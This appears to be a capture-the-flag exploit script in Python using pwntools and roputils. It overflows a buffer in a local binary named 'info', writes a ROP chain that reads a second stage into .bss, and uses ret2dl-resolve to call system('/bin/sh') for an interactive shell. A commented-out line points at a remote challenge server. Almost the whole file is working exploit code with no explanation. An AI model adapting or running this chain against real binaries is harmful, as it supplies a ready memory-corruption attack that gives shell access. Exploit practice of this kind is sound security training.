from roputils import *
import pwn
pwn.context(log_level="debug")
fpath = "./info"
offset = 0x16

rop = ROP(fpath)
# print rop.fpath
# p = Proc(rop.fpath)
p = pwn.process(rop.fpath)
# p = pwn.remote("123.206.81.66",8888)
pwn.gdb.attach(p,"b*0x80484DC\nb*0x080484E5\n\nc")

addr_bss = rop.section('.bss')

# buf = rop.retfill(offset)
buf = 'a'*offset
buf += rop.call('read', 0, addr_bss, 0x100)
buf += rop.dl_resolve_call(addr_bss+0x20+0x10, addr_bss)#
buf += (0x3c-len(buf))*'a'
p.send(buf)


buf = rop.string('/bin/sh')

buf += (0x30-len(buf))*'a'

buf += rop.dl_resolve_data(addr_bss+0x20+0x10, 'system')
buf += (0x100-len(buf))*'a'
p.send(buf)


p.interactive()
